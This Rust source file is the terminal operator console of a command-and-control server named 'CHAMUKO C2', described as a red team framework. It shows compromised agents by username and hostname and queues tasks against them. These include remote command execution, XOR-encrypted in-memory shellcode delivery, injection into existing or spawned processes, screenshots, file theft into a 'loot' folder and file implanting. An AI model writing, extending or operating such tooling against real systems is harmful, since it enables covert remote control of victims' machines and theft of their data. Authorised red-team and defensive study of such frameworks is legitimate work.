use std::io;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use base64::Engine;
use crossterm::event::{self, Event, KeyCode, KeyEvent, KeyModifiers};
use crossterm::execute;
use crossterm::terminal::{
    disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen,
};
use ratatui::backend::CrosstermBackend;
use ratatui::layout::{Constraint, Direction, Layout, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Borders, List, ListItem, ListState, Paragraph, Wrap};
use ratatui::Frame;
use ratatui::Terminal;

use crate::state::State;

const RED: Color = Color::Rgb(192, 32, 32);
const DARK_RED: Color = Color::Rgb(128, 16, 16);
const BLACK: Color = Color::Black;
const GREY: Color = Color::Rgb(160, 160, 160);
const BRIGHT: Color = Color::Rgb(255, 80, 80);

pub struct App {
    state: Arc<Mutex<State>>,
    selected: ListState,
    input: String,
    history: Vec<String>,
    history_idx: usize,
    console_scroll: usize,
    status: String,
    quit: bool,
}

impl App {
    pub fn new(state: Arc<Mutex<State>>) -> Self {
        Self {
            state,
            selected: ListState::default(),
            input: String::new(),
            history: Vec::new(),
            history_idx: 0,
            console_scroll: 0,
            status: String::new(),
            quit: false,
        }
    }

    fn agent_ids(&self) -> Vec<String> {
        self.state.lock().unwrap().agent_ids()
    }

    fn selected_agent(&self) -> Option<String> {
        let ids = self.agent_ids();
        self.selected.selected().and_then(|i| ids.get(i).cloned())
    }

    fn ensure_selection(&mut self) {
        let ids = self.agent_ids();
        if ids.is_empty() {
            self.selected.select(None);
            return;
        }
        match self.selected.selected() {
            Some(i) if i < ids.len() => {}
            _ => self.selected.select(Some(0)),
        }
    }

    fn select_next(&mut self) {
        let ids = self.agent_ids();
        if ids.is_empty() {
            return;
        }
        let i = self.selected.selected().unwrap_or(0);
        let next = if i + 1 < ids.len() { i + 1 } else { i };
        self.selected.select(Some(next));
        self.console_scroll = 0;
    }

    fn select_prev(&mut self) {
        let i = self.selected.selected().unwrap_or(0);
        let prev = if i > 0 { i - 1 } else { 0 };
        self.selected.select(Some(prev));
        self.console_scroll = 0;
    }

    fn submit(&mut self) {
        let cmd = self.input.trim().to_string();
        if cmd.is_empty() {
            return;
        }
        self.history.push(cmd.clone());
        self.history_idx = self.history.len();
        self.input.clear();
        self.status.clear();

        let parts: Vec<&str> = cmd.splitn(2, char::is_whitespace).collect();
        let head = parts[0];
        let rest = parts.get(1).copied().unwrap_or("");

        match head {
            "quit" | "exit" => self.quit = true,
            "clear" => self.console_scroll = 0,
            "help" => self.local_log(
                "commands:\n  \
                 list              refresh agent list\n  \
                 use <id>          select agent by id\n  \
                 exec <cmd...>     run command on agent\n  \
                 shellcode <file>  send encrypted shellcode to agent (in-memory exec)\n  \
                 ps                list processes on the agent\n  \
                 screenshot        capture the agent's screen into ./loot\n  \
                 messagebox [title] [text]  show a dialog on the agent's desktop\n  \
                 inject <pid> <b64>        run shellcode inside an existing process\n  \
                 inject-spawn <b64> [exe]  start a process and inject into it\n  \
                 download <path>   pull a file from the agent into ./loot\n  \
                 implant <src> <dst>  push a local file to the agent\n  \
                 tasks             show task history and status\n  \
                 loot              show files collected so far\n  \
                 staged            show files waiting for pickup\n  \
                 <cmd...>          alias for exec\n  \
                 sleep <s>         set agent sleep seconds\n  \
                 jitter <s>        set agent jitter seconds\n  \
                 clear             reset console scroll\n  \
                 quit              exit",
            ),
            "list" => self.refresh_list_log(),
            "use" => self.handle_use(rest),
            "sleep" => self.handle_config("sleep", rest),
            "jitter" => self.handle_config("jitter", rest),
            "shellcode" => self.handle_shellcode(rest),
            "screenshot" => self.send_to_agent("screenshot", ""),
            "messagebox" => self.send_to_agent("messagebox", rest),
            "inject" => self.send_to_agent("inject", rest),
            "inject-spawn" => self.send_to_agent("inject-spawn", rest),
            "tasks" => self.show_tasks(),
            "loot" => self.show_loot(),
            "download" => self.handle_download(rest),
            "implant" => self.handle_implant(rest),
            "staged" => self.show_staged(),
            _ => self.send_to_agent(head, rest),
        }
    }

    fn handle_use(&mut self, rest: &str) {
        let id = rest.trim();
        if id.is_empty() {
            self.local_log("usage: use <agent-id>");
            return;
        }
        let ids = self.agent_ids();
        if let Some(idx) = ids.iter().position(|x| x == id) {
            self.selected.select(Some(idx));
            self.console_scroll = 0;
        } else {
            self.local_log(format!("no agent with id '{id}'"));
        }
    }

    fn handle_config(&mut self, key: &str, rest: &str) {
        let Some(id) = self.selected_agent() else {
            self.local_log("no agent selected");
            return;
        };
        let val: u64 = match rest.trim().parse() {
            Ok(v) => v,
            Err(_) => {
                self.local_log(format!("usage: {key} <seconds>"));
                return;
            }
        };
        let mut s = self.state.lock().unwrap();
        if let Some(entry) = s.get_mut(&id) {
            match key {
                "sleep" => entry.sleep = val,
                "jitter" => entry.jitter = val,
                _ => {}
            }
            entry.push_console(format!("[c2] {key} set to {val}s"));
        }
    }

    fn send_to_agent(&mut self, head: &str, rest: &str) {
        let Some(id) = self.selected_agent() else {
            self.local_log("no agent selected (use 'list' / 'use <id>')");
            return;
        };
        let args = match split_args(rest) {
            Ok(args) => args,
            Err(e) => {
                self.local_log(format!("bad arguments: {e}"));
                return;
            }
        };
        let mut s = self.state.lock().unwrap();
        if s.enqueue_task(&id, head.to_string(), args).is_none() {
            drop(s);
            self.local_log("failed to enqueue task");
        }
    }

    fn handle_shellcode(&mut self, rest: &str) {
        let Some(id) = self.selected_agent() else {
            self.local_log("no agent selected (use 'list' / 'use <id>')");
            return;
        };
        let path = rest.trim();
        if path.is_empty() {
            self.local_log("usage: shellcode <file>");
            return;
        }
        let data = match std::fs::read(path) {
            Ok(d) => d,
            Err(e) => {
                self.local_log(format!("failed to read shellcode file: {e}"));
                return;
            }
        };
        if data.is_empty() {
            self.local_log("shellcode file is empty");
            return;
        }

        let encrypted = chamuko_protocol::xor_transform(
            &data,
            chamuko_protocol::SHELLCODE_XOR_KEY,
        );
        let encoded = base64::engine::general_purpose::STANDARD.encode(&encrypted);

        let mut s = self.state.lock().unwrap();
        match s.enqueue_task(&id, "shellcode".to_string(), vec![encoded]) {
            Some(task_id) => {
                drop(s);
                self.local_log(format!(
                    "[c2] shellcode queued ({} bytes -> task {})",
                    data.len(),
                    task_id
                ));
            }
            None => {
                drop(s);
                self.local_log("failed to enqueue shellcode task");
            }
        }
    }

    fn show_tasks(&mut self) {
        let Some(id) = self.selected_agent() else {
            self.local_log("no agent selected");
            return;
        };
        let s = self.state.lock().unwrap();
        let Some(entry) = s.get(&id) else {
            drop(s);
            self.local_log("agent not found");
            return;
        };
        if entry.tasks.is_empty() {
            drop(s);
            self.local_log("no tasks yet");
            return;
        }
        let mut lines = Vec::new();
        for task in &entry.tasks {
            let elapsed = task
                .duration_ms
                .map(|ms| format!(" {ms}ms"))
                .unwrap_or_default();
            lines.push(format!(
                "[{}] {}{elapsed}",
                clock(task.created),
                task.summary()
            ));
            if let Some(err) = &task.error {
                lines.push(format!("    error: {err}"));
            } else if !task.output.is_empty() {
                let first: String = task.output.lines().take(3).collect::<Vec<_>>().join(" | ");
                lines.push(format!("    {}", first.chars().take(160).collect::<String>()));
            }
        }
        drop(s);
        self.local_log(lines.join("\n"));
    }

    fn show_loot(&mut self) {
        let s = self.state.lock().unwrap();
        let loot = s.loot();
        if loot.is_empty() {
            drop(s);
            self.local_log("loot is empty");
            return;
        }
        let lines: Vec<String> = loot
            .iter()
            .map(|l| {
                format!(
                    "[{}] {}  {} bytes  sha256={}..  from {}",
                    clock(l.received),
                    l.path.display(),
                    l.size,
                    &l.sha256[..12],
                    l.agent_id
                )
            })
            .collect();
        drop(s);
        self.local_log(lines.join("\n"));
    }

    fn show_staged(&mut self) {
        let s = self.state.lock().unwrap();
        let staged = s.staged();
        if staged.is_empty() {
            drop(s);
            self.local_log("nothing staged");
            return;
        }
        let lines: Vec<String> = staged
            .iter()
            .map(|(id, name, size)| format!("{id}  {name}  {size} bytes"))
            .collect();
        drop(s);
        self.local_log(lines.join("\n"));
    }

    /// Pulls a file from the agent; the agent streams it back in chunks.
    fn handle_download(&mut self, rest: &str) {
        let Some(id) = self.selected_agent() else {
            self.local_log("no agent selected");
            return;
        };
        let path = rest.trim();
        if path.is_empty() {
            self.local_log("usage: download <path>");
            return;
        }
        let mut s = self.state.lock().unwrap();
        match s.enqueue_task(&id, "download".to_string(), vec![path.to_string()]) {
            Some(task_id) => {
                drop(s);
                self.local_log(format!("[c2] download queued as {task_id}"));
            }
            None => {
                drop(s);
                self.local_log("failed to queue download");
            }
        }
    }

    /// Stages a local file and tells the agent to pull and write it.
    fn handle_implant(&mut self, rest: &str) {
        let Some(id) = self.selected_agent() else {
            self.local_log("no agent selected");
            return;
        };
        let args = match split_args(rest) {
            Ok(a) => a,
            Err(e) => {
                self.local_log(format!("bad arguments: {e}"));
                return;
            }
        };
        if args.len() != 2 {
            self.local_log("usage: implant <local-file> <remote-path>");
            return;
        }
        let data = match std::fs::read(&args[0]) {
            Ok(d) => d,
            Err(e) => {
                self.local_log(format!("cannot read {}: {e}", args[0]));
                return;
            }
        };
        let name = std::path::Path::new(&args[0])
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_else(|| "payload".to_string());

        let mut s = self.state.lock().unwrap();
        let transfer = s.stage_download(&name, data.clone());
        let task = s.enqueue_task(
            &id,
            "implant".to_string(),
            vec![transfer.clone(), args[1].clone()],
        );
        match task {
            Some(task_id) => {
                drop(s);
                self.local_log(format!(
                    "[c2] staged {} bytes as {transfer}; implant queued as {task_id}",
                    data.len()
                ));
            }
            None => {
                drop(s);
                self.local_log("failed to queue implant");
            }
        }
    }

    fn local_log(&mut self, text: impl Into<String>) {
        let text = text.into();
        if let Some(id) = self.selected_agent() {
            let mut s = self.state.lock().unwrap();
            if let Some(entry) = s.get_mut(&id) {
                entry.push_console(text);
                return;
            }
        }
        self.status = text;
    }

    fn refresh_list_log(&mut self) {
        let ids = self.agent_ids();
        if ids.is_empty() {
            self.local_log("no agents connected");
            return;
        }
        let s = self.state.lock().unwrap();
        let mut lines = Vec::new();
        for id in &ids {
            if let Some(e) = s.get(id) {
                lines.push(format!(
                    "{}  {}@{}  {}  last_seen={}s ago",
                    id,
                    e.info.username,
                    e.info.hostname,
                    e.info.os,
                    chamuko_protocol::now_secs().saturating_sub(e.last_seen),
                ));
            }
        }
        drop(s);
        self.local_log(lines.join("\n"));
    }

    fn history_prev(&mut self) {
        if self.history.is_empty() {
            return;
        }
        if self.history_idx > 0 {
            self.history_idx -= 1;
            self.input = self.history[self.history_idx].clone();
        }
    }

    fn history_next(&mut self) {
        if self.history_idx + 1 < self.history.len() {
            self.history_idx += 1;
            self.input = self.history[self.history_idx].clone();
        } else {
            self.history_idx = self.history.len();
            self.input.clear();
        }
    }
}

pub fn run(state: Arc<Mutex<State>>) -> io::Result<()> {
    enable_raw_mode()?;
    let mut stdout = io::stdout();
    execute!(stdout, EnterAlternateScreen,)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let mut app = App::new(state);
    app.ensure_selection();

    while !app.quit {
        app.ensure_selection();
        terminal.draw(|f| ui(f, &mut app))?;

        if event::poll(Duration::from_millis(200))? {
            if let Event::Key(key) = event::read()? {
                handle_key(&mut app, key);
            }
        }
    }

    disable_raw_mode()?;
    execute!(terminal.backend_mut(), LeaveAlternateScreen,)?;
    terminal.show_cursor()?;
    Ok(())
}

fn handle_key(app: &mut App, key: KeyEvent) {
    match key.code {
        KeyCode::Char('c') if key.modifiers.contains(KeyModifiers::CONTROL) => {
            app.quit = true;
        }
        KeyCode::Enter => app.submit(),
        KeyCode::Up => {
            if key.modifiers.contains(KeyModifiers::SHIFT) {
                app.console_scroll = app.console_scroll.saturating_sub(1);
            } else {
                app.history_prev();
            }
        }
        KeyCode::Down => {
            if key.modifiers.contains(KeyModifiers::SHIFT) {
                app.console_scroll += 1;
            } else {
                app.history_next();
            }
        }
        KeyCode::Left => app.select_prev(),
        KeyCode::Right => app.select_next(),
        KeyCode::Tab => app.select_next(),
        KeyCode::Backspace => {
            app.input.pop();
        }
        KeyCode::Char(c) => {
            app.input.push(c);
        }
        _ => {}
    }
}

fn ui(f: &mut Frame, app: &mut App) {
    let size = f.area();

    let title_style = Style::default().fg(RED).bg(BLACK).add_modifier(Modifier::BOLD);
    let title = Paragraph::new(Line::from(vec![
        Span::styled("  CHAMUKO C2 ", title_style),
        Span::styled(
            "| red team framework",
            Style::default().fg(GREY).bg(BLACK),
        ),
    ]))
    .block(Block::default().style(Style::default().bg(BLACK)));

    let chunks = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Length(3), Constraint::Min(1), Constraint::Length(3)])
        .split(size);

    f.render_widget(title, chunks[0]);

    let body = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Percentage(28), Constraint::Percentage(72)])
        .split(chunks[1]);

    render_agents(f, app, body[0]);
    render_console(f, app, body[1]);

    let footer = match app.selected_agent() {
        Some(id) => {
            let s = app.state.lock().unwrap();
            match s.get(&id) {
                Some(e) => {
                    let done = e
                        .tasks
                        .iter()
                        .filter(|t| t.status == chamuko_protocol::TaskStatus::Completed)
                        .count();
                    let failed = e
                        .tasks
                        .iter()
                        .filter(|t| t.status == chamuko_protocol::TaskStatus::Failed)
                        .count();
                    let last = e
                        .last_finished()
                        .map(|t| format!(" | last: {}", t.summary()))
                        .unwrap_or_default();
                    format!(
                        "{id} | {} task(s): {} done, {} failed, {} queued | loot {} | {}{last}",
                        e.tasks.len(),
                        done,
                        failed,
                        e.pending_count(),
                        s.loot().len(),
                        e.info.os
                    )
                }
                None => "agent not found".to_string(),
            }
        }
        None => String::from("no agent selected"),
    };

    let input_title = if app.status.is_empty() {
        format!(" {footer} ")
    } else {
        format!(" {} ", app.status.lines().next().unwrap_or(""))
    };
    let input = Paragraph::new(app.input.as_str())
        .style(Style::default().fg(BRIGHT).bg(BLACK))
        .block(
            Block::default()
                .borders(Borders::ALL)
                .border_style(Style::default().fg(DARK_RED))
                .style(Style::default().bg(BLACK))
                .title(Span::styled(
                    input_title,
                    Style::default().fg(RED).add_modifier(Modifier::BOLD),
                )),
        );
    f.render_widget(input, chunks[2]);

    let input_area = inner_input_rect(chunks[2]);
    f.set_cursor_position(ratatui::prelude::Position {
        x: input_area.x + app.input.len() as u16,
        y: input_area.y,
    });
}

fn inner_input_rect(outer: Rect) -> Rect {
    let x = outer.x + 2;
    let y = outer.y + 1;
    let width = outer.width.saturating_sub(4);
    Rect {
        x,
        y,
        width,
        height: 1,
    }
}

fn render_agents(f: &mut Frame, app: &mut App, area: Rect) {
    let ids = app.agent_ids();
    let s = app.state.lock().unwrap();

    let items: Vec<ListItem> = ids
        .iter()
        .filter_map(|id| {
            let e = s.get(id)?;
            let age = chamuko_protocol::now_secs().saturating_sub(e.last_seen);
            let line = Line::from(vec![
                Span::styled(
                    format!("{id}  "),
                    Style::default().fg(RED).add_modifier(Modifier::BOLD),
                ),
                Span::styled(
                    format!("{}@{}", e.info.username, e.info.hostname),
                    Style::default().fg(GREY),
                ),
                Span::styled(format!("  {age}s"), Style::default().fg(DARK_RED)),
                if e.pending_count() > 0 {
                    Span::styled(
                        format!("  {}q", e.pending_count()),
                        Style::default().fg(BRIGHT),
                    )
                } else {
                    Span::raw("")
                },
            ]);
            Some(ListItem::new(line))
        })
        .collect();

    let list = List::new(items)
        .block(
            Block::default()
                .borders(Borders::ALL)
                .border_style(Style::default().fg(DARK_RED))
                .style(Style::default().bg(BLACK))
                .title(Span::styled(
                    " agents ",
                    Style::default().fg(RED).add_modifier(Modifier::BOLD),
                )),
        )
        .highlight_style(
            Style::default()
                .bg(RED)
                .fg(BLACK)
                .add_modifier(Modifier::BOLD),
        )
        .highlight_symbol("> ");

    f.render_stateful_widget(list, area, &mut app.selected);
}

fn render_console(f: &mut Frame, app: &mut App, area: Rect) {
    let agent_id = app.selected_agent();
    let title = agent_id
        .clone()
        .unwrap_or_else(|| "no agent selected".to_string());

    let lines: Vec<Line> = match agent_id {
        Some(id) => {
            let s = app.state.lock().unwrap();
            match s.get(&id) {
                Some(e) => e
                    .console
                    .iter()
                    .map(|l| Line::from(format!("{} {}", clock(l.ts), l.text)))
                    .collect(),
                None => vec![Line::from("agent not found")],
            }
        }
        None => vec![Line::from(Span::styled(
            "no agent selected, use 'list' and 'use <id>'",
            Style::default().fg(GREY),
        ))],
    };

    let width = area.width.saturating_sub(2).max(1) as usize;
    let visible = area.height.saturating_sub(2) as usize;
    let total = wrapped_rows(&lines, width);

    let para = Paragraph::new(lines)
        .block(
            Block::default()
                .borders(Borders::ALL)
                .border_style(Style::default().fg(DARK_RED))
                .style(Style::default().bg(BLACK))
                .title(Span::styled(
                    format!(" console: {title} "),
                    Style::default().fg(RED).add_modifier(Modifier::BOLD),
                )),
        )
        .style(Style::default().fg(Color::Rgb(230, 230, 230)).bg(BLACK))
        .wrap(Wrap { trim: false });

    let max_offset = total.saturating_sub(visible);
    app.console_scroll = app.console_scroll.min(max_offset);
    let offset = max_offset - app.console_scroll;

    f.render_widget(para.scroll((offset as u16, 0)), area);
}

/// Approximates how many terminal rows `lines` occupy once wrapped at `width`.
fn wrapped_rows(lines: &[Line], width: usize) -> usize {
    lines
        .iter()
        .map(|line| {
            let chars: usize = line.spans.iter().map(|s| s.content.chars().count()).sum();
            chars.div_ceil(width).max(1)
        })
        .sum::<usize>()
        .max(1)
}

/// Formats a Unix timestamp as `HH:MM:SS` in UTC.
fn clock(ts: chamuko_protocol::Timestamp) -> String {
    let secs = ts % 86_400;
    format!("{:02}:{:02}:{:02}", secs / 3600, (secs % 3600) / 60, secs % 60)
}

/// Splits a command line into arguments, respecting single and double quotes.
fn split_args(input: &str) -> Result<Vec<String>, String> {
    let mut args = Vec::new();
    let mut current = String::new();
    let mut started = false;
    let mut quote: Option<char> = None;

    for ch in input.chars() {
        match quote {
            Some(q) if ch == q => quote = None,
            Some(_) => current.push(ch),
            None if ch == '"' || ch == '\'' => {
                quote = Some(ch);
                started = true;
            }
            None if ch.is_whitespace() => {
                if started {
                    args.push(std::mem::take(&mut current));
                    started = false;
                }
            }
            None => {
                current.push(ch);
                started = true;
            }
        }
    }

    if quote.is_some() {
        return Err("unterminated quote".to_string());
    }
    if started {
        args.push(current);
    }
    Ok(args)
}

#[cfg(test)]
mod tests {
    use super::split_args;

    #[test]
    fn splits_plain_words() {
        assert_eq!(split_args("a b  c").unwrap(), vec!["a", "b", "c"]);
        assert!(split_args("   ").unwrap().is_empty());
    }

    #[test]
    fn keeps_quoted_segments_together() {
        assert_eq!(
            split_args(r#""C:\Program Files\app.exe" --flag 'x y'"#).unwrap(),
            vec![r"C:\Program Files\app.exe", "--flag", "x y"]
        );
    }

    #[test]
    fn preserves_empty_quoted_argument() {
        assert_eq!(split_args("exec ''").unwrap(), vec!["exec", ""]);
    }

    #[test]
    fn rejects_unterminated_quotes() {
        assert!(split_args("exec \"oops").is_err());
    }
}
